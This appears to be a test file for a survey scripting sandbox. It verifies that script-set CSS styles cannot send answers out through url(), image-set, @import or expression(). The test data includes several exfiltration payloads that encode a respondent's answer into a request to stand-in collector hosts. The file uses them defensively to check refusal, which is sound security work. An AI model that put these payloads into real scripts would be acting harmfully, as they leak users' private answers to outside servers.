import { test } from "node:test";
import assert from "node:assert/strict";
import { checkDeclarations, scriptStyleRefusal, validateUxScript } from "./index.js";

/**
 * AUDIT 2026-10-30 D4 — NO NETWORK THROUGH CSS FROM SCRIPTS.
 *
 * Probe 2 (ssa/s1-probe2.mjs): a sandboxed script set `background-image: url(https://collector/?d=<answer>)` and
 * both gates accepted it — the authoring gate (`validateUxScript`) and the runtime one (`checkDeclarations`, which
 * the host DomBridge and UxLayer setStyle call). Script-originated styles now refuse anything that fetches;
 * author-written static styles keep today's rule (https url() and inline rasters allowed).
 */

const def = { meta: { id: "s" }, questions: [{ id: "q1", code: "Q1", variableName: "Q1", type: "text", text: "Name", settings: {}, options: [] }], flow: [], scripts: [], branding: {}, ux: { styles: [], animations: [], behaviors: [] } } as never;

test("D4 probe 2 (authoring gate): url() built from an answer is refused in every spelling", () => {
  const scripts = {
    css_exfil: 'rs.listen("change", function (e) { rs.setStyle("self", { backgroundImage: "url(https://collector.example/c?d=" + encodeURIComponent(String(e.value)) + ")" }); });',
    mirror_exfil: 'document.querySelector("[data-qid]").style.backgroundImage = "url(https://collector.example/c?d=" + encodeURIComponent(String(rs.getAnswer("Q1"))) + ")";',
    tpl: 'rs.setStyle("self", { backgroundImage: `url(https://collector.example/c?d=${rs.getAnswer("Q1")})` });',
    imageSet: 'rs.setStyle("self", { backgroundImage: "image-set(\\"https://c.example/?d=" + rs.getAnswer("Q1") + "\\" 1x)" });',
    prefix: 'var u = rs.getAnswer("Q1"); rs.setStyle("self", { background: "red " + "url(https://c.example/" + u + ")" });',
  };
  for (const [k, code] of Object.entries(scripts)) {
    const r = validateUxScript(code, def);
    assert.ok(r.errors.some((e) => /url\(\) built from code/.test(e)), `${k}: ${JSON.stringify(r.errors)}`);
  }
  // an ordinary script is untouched
  assert.deepEqual(validateUxScript('rs.setStyle("self", { color: "red" });', def).errors, []);
});

test("D4 probe 2 (runtime gate): checkDeclarations with origin script refuses url / image-set / @import / expression", () => {
  for (const v of [
    "url(https://collector.example/c?d=hello%20world)",
    'url("https://collector.example/c")',
    "URL( https://x.example/a )",
    'image-set("https://x.example/a.png" 1x)',
    '-webkit-image-set(url(https://x.example/a.png) 1x)',
    "linear-gradient(red, blue), url(https://x.example/a.png)",
    "expression(alert(1))",
    "@import 'https://x.example/a.css'",
    "cross-fade(url(a.png), url(b.png), 50%)",
  ]) {
    const c = checkDeclarations({ backgroundImage: v }, { origin: "script" });
    assert.deepEqual(c.ok, {}, v);
    assert.equal(c.errors.length, 1, v);
    assert.match(c.errors[0], /a script cannot load anything through a style/, v);
  }
  // a script still styles: colours, gradients, sizes
  const fine = checkDeclarations({ color: "red", backgroundImage: "linear-gradient(red, blue)", width: "50%" }, { origin: "script" });
  assert.deepEqual(fine.errors, []);
  assert.equal(Object.keys(fine.ok).length, 3);
});

test("D4: author-written static styles keep today's rule (https url() allowed, http refused)", () => {
  assert.deepEqual(checkDeclarations({ backgroundImage: "url(https://cdn.example/a.png)" }).errors, []);
  assert.deepEqual(checkDeclarations({ backgroundImage: "url(https://cdn.example/a.png)" }, { origin: "author" }).errors, []);
  assert.equal(checkDeclarations({ backgroundImage: "url(http://cdn.example/a.png)" }).errors.length, 1);
  assert.equal(scriptStyleRefusal("red"), null);
});
